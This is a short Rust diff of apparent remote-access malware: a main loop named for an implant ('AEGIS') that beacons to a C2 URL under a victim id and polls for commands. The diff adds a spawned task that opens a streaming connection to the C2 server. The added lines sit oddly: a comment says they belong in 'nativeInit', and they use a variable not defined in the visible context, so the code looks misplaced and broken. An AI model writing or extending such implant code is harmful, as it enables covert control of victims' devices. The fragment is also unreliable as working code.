@@ -231,7 +231,10 @@ async fn aegis_main_loop(c2_url: String, victim_id: String) {
                 Err(e) => log::warn!("[AEGIS] Heartbeat failed: {}", e),
             }
         }
-
+// Inside nativeInit, after rt.spawn(aegis_main_loop...)
+rt.spawn(async move {
+    comms::start_stream_client(&c2_url_str, &victim_id).await;
+});
         // 2. Poll Commands
         match comms::poll_commands(&c2_url, &victim_id).await {
             Ok(cmds) => {
